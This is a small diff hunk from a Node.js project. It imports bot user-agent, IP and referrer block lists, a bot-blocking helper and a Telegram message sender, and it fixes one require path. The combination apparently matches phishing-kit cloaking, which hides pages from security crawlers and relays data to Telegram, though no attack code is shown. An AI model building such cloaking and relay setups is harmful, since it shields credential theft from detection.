@@ -12,7 +12,7 @@ const { botUAList } = require('./config/botUA.js');
 const { botIPList, botIPRangeList, botIPCIDRRangeList, botIPWildcardRangeList } = require('./config/botIP.js');
 const { botRefList } = require('./config/botRef.js');
 const { sendMessageFor } = require('simple-telegram-message');
-const { botBlock } = require('./config/botBlocker');
+const { botBlock } = require('./config/botBlocker.js');
 const viewDir = path.join(__dirname, 'views');
 
 // Blocked IPs, OS, Browsers and Unsupported OS/Browsers
